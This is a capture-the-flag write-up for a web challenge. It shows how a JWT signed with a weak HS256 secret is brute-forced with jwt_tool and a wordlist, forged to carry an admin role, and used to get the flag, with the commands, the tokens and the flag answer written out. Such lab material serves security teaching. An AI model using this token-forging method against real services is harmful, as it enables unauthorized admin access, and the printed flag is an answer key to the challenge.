## **Challenge Overview**

**Name:** JWT Weak Secret
**Category:** Web Exploitation  
**Difficulty:** Medium
**Points**: 300
###### Challenge Description

Our company just launched a shiny new authentication portal backed by JSON Web Tokens. The development team assures us the signing key is rock-solid. A guest account is available for demo purposes -- feel free to look around, but the admin panel is strictly off-limits.

---
## **Initial Reconnaissance**

### **Step 1: Obtain a JWT Token**

Using the provided guest credentials:

```
curl -X POST http://chall-86eca813.evt-246.glabs.ctf7.com/login \  
-H "Content-Type: application/json" \  
-d '{"username":"guest","password":"guest"}'
```

![](attachments/Untitled-1.png)

Jwt_Token
```
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIn0.9I4AjxfWP9qp8qeBqcAP9y-YjEUbpVAZgveZ7Ey90bA"
}
```


### **Brute-force the Secret Key**

Using a tool like [`jwt_tool`](https://github.com/ticarpi/jwt_tool) with a common wordlist:
```
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

**Result:**
```
[+] secret123 is the CORRECT key!
```

![](attachments/Untitled.png)

### **Modify the Token**

Update the payload:
{  
  "sub": "guest",  
  "role": "admin"  
}
### **Step 3: Re-sign the Token**

Using the discovered secret:

```
python3 jwt_tool.py -S hs256 -p "secret123" -I
```

This generates a valid admin token.

Access Admin Endpoint
```
curl http://chall-86eca813.evt-246.glabs.ctf7.com/admin \
-H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG1pbiJ9.lohUuBC44p2u53tAQ8jGvZSAAHYmAvT6pgn4wLs4DPs
{"flag":"ctf7{cant_guess_jwt_0898bce7}"}
```

**flag**
```
flag":"ctf7{cant_guess_jwt_0898bce7}
```

---
